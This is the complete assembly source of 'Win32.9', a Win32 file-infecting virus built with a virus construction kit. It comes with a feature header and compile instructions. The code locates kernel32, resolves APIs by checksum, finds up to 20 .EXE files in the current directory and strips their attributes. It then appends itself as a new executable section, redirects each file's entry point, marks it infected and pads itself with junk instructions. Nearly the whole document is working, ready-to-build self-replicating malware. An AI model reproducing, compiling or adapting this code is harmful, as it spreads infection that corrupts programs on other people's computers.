              
;
;
; Win32.9 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.9
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 9
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 47
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
                                        ; mov ebp, eax
 mov ebp, eax
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea esi, [ebp+WFD_szFileName]
 xchg esi, edx

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 lea esi, [ebp+WFD_nFileSizeHigh]
 xchg ecx, esi

 cmp dword ptr [ecx], 0
 jne NoInfection
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 mov eax, 99992021d                     ; Trash
 pop ecx
 cmp ecx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov esi, -1
 mov esi, ( -1d - 0d )
 add esi, 0d
 and esi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear edx
 mov edx, -6487d
 add edx, 6487d
 mov dx, word ptr [esi+3Ch]
 or edx, edx
 jz Notagoodfile
 push dword ptr [esi+3Ch]
 pop ecx
                                        ; check if header lies inside the file
 cmp ecx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add ecx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx ebx, word ptr [ecx]
 sub ebx, 'EP'
 jz Goodfile2
                                        ; mov ebx, 29285
 mov ebx, 0
 add ebx, 29285d
 cmp ebx, 29285d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ecx+4Ch], '9'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 AlignReg2   dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.NGVCKvx'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Trash1      dd 0h
 K32Trys     dd 0h
 MapHandle   dd 0h

 PEheader    dd 0h
 FileHandle  dd 0h
 Misc1       dd 0h
 NTableTemp  dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h

 db 'Win32.9 - SnakeByte',0
 Attributes  dd 0h
 OTableVA    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempApisearch2 dd 0h
 filealign   dd 0h
 MapAddress  dd 0h
 filemask    db '*.EXe',0
 NewSize     dd 0h
 TempApisearch3 dd 0h
 ATableVA    dd 0h

 APINames:
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'

 OldBase     dd 400000h
 InfCounter  dd 0h
 sectionalign   dd 0h
 KernelPE    dd 0h
 NTableVA    dd 0h
 AlignReg1   dd 0h
 TempAPI     dd 0h
 KernelMZ    dd 0h
 OldEIP      dd 0h
 NewEIP      dd 0h
 counter     dw 0h
 FindHandle  dd 0h




;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edi, [ebp+WIN32_FIND_DATA]
 xchg edi, edx

 push edx
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov edx, 276
 mov edx, 0
 add edx, 276d
 lea ebx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 sub ebx, -1d
 dec edx
 jnz ClearOldData2
 popad
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea edx, [ebp+filemask]
 xchg ebx, edx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 pop edx
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

 mov edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 push edx
ret



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear esi
 xor esi, esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edi, esi
 add edi, [esi+3Ch]
                                        ; get File Alignment
                                        ; add edi, 60
 add edi, 60d
 mov edx, [edi]
 add edi, -60d
 mov dword ptr [ebp+filealign], edx
                                        ; clear esi
 mov esi, 63202d
 sub esi, 63202d
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov ecx, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], ecx
 mov edx, dword ptr [edi+34h]
 mov dword ptr [ebp+OldBase], edx
 mov ecx, [edi+38h]
 mov dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ebx, [edi+74h]
 shl ebx, 3
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [edi+6h]
 mov ecx, 28h
 pushad
 mov eax, eax
 mul ecx
 mov dword ptr [ebp+Misc1], eax
 popad
                                        ; clear eax
 and eax, 0
 xor eax, dword ptr [ebp+Misc1]
 add edi, 78h
 add edi, ebx
 add edi, eax
 lea edx, [ebp+newsection]
 xchg edx, ebx


 xchg ebx, edi
 push ebx
                                        ; Calculate the RVA of the new section
 mov eax, [ebx-5*8+8d]
 add eax, [ebx-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 push eax
 pop dword ptr [ebp+nsphysicalsize]
 Call Align
                                        ; clear ecx
 mov ecx, -64549d
 add ecx, 64549d
 xor ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ecx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov eax,[ebx-5*8+20d]
 add eax,[ebx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+AlignReg1]
 push ebx
 pop dword ptr [ebp+nsphysicaloffset]
                                        ; calculate new size
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 36d )
 xor ecx, 36d
 and ecx, dword ptr [ebp+filealign]
 mov eax, ebx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop eax
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 add dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 pop ebx
                                        ; mov edx, 64
 mov edx, 0
 add edx, 64d
 lea edi, [ebp+newsection]
 xchg edi, esi

WriteNewSectionLoop:
 mov ch, byte ptr [esi]
 mov byte ptr [ebx], ch
 add edx, -1
                                        ; add ebx, 1
 inc ebx
                                        ; add esi, 1
 add esi, 1d
 test edx, edx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+PEheader]
 add word ptr [ebx+06h], 1
 push dword ptr [ebp+nsRVA]
 pop ecx
 mov dword ptr [ebp+NewEIP], ecx
 not eax                                ; Trash
                                        ; set new EIP
 mov dword ptr  [ebx+28h], ecx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], '9'
                                        ; clear edx
 mov edx, -5498d
 add edx, 5498d
 add edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 lea edx, [ebp+Virus]
 xchg edx, esi

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 add ebx, 80984046d                     ; Trash
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], 0
 xor dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 dec eax
 add eax, 1
 jz CloseFile
                                        ; clear eax
 push 0
 pop eax
 push ecx
 push eax
 push eax
 push 2h
 shl edx, 12d                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]
 rcl edx, 28d                           ; Trash

 lea ecx, [ebp+APIOffsets]
 xchg ecx, esi


GetApisLoop: 

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 add eax, 4d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], -1
 and dword ptr [esi], edx
                                        ; add esi, 4
 inc esi
 add esi, 3d
 dec ebx
 jnz GetApisLoop
 mov edi, ebp
 add edi, offset Outbreak

 push edi
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx

                                        ; mov edx, -1
 mov edx, ( -1d - 29d )
 add edx, 29d
 and edx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edx


                                        ; get Kernel by using hardcoded values
 mov edi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edi, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 push 0
 pop ecx

 or ebx, 78613653d                      ; Trash
 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 lea ecx, [ebp+GetKernel32Exception]

 push ecx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 5h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 jmp GetKernel32NotFound
GotKernelXX:
                                        ; check for ZM
 movzx edx, word ptr [edi]
 sub edx, 'ZM'
 jz CheckPE

GK2:
 add edi, -65536d
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov ebx, [edi+3Ch]
 add ebx, edi
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelMZ], -1
 and dword ptr [ebp+KernelMZ], edi
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], ebx

                                        ; clear edx
 xor edx, edx

 pop dword ptr fs:[edx]
 pop eax
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear edx
 xor edx, edx

 mov ebx, dword ptr fs:[edx]
 mov esp, dword ptr [ebx]
GetKernel32NotFound:
                                        ; clear eax
 xor eax, eax

 pop dword ptr fs:[eax]
 pop ebx
 popad
 stc
ret


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



                                        ; clear ebx
 mov ebx, 31788d
 sub ebx, 31788d
 add ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edi, [ebx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 dec edi
 add edi, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
                                        ; get NTableVA
 mov ebx, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [edi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
 mov ecx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ecx
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [ecx]
                                        ; mov ecx, ebx
 push ebx
 pop ecx
                                        ; mov edi, ebx
 push ebx
 pop edi
 mov dword ptr [ebp+TempApisearch2], edi
 mov dword ptr [ebp+TempApisearch3], eax
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 push dword ptr [eax]
 pop ebx
 LoopChsksm:
                                        ; clear edx
 xor edx, edx
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl dx,8d
 sub ebx, edx
 cmp dx, 0
 je LoopConti
                                        ; clear edx
 push 0
 pop edx
 mov dl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 sub ebx, edx
 test dx, dx
 jnz LoopChsksm
LoopConti:
 cmp ebx, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 mov eax, dword ptr [ebp+TempApisearch3]
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+TempApisearch2]
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+NTableTemp]
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov edi, edx
 xor dword ptr [ebp+Trash1], 673347     ; Trash
                                        ; clear edx
 and edx, 0
 mov dx, word ptr [edi]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -41930d
 add edx, 41930d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

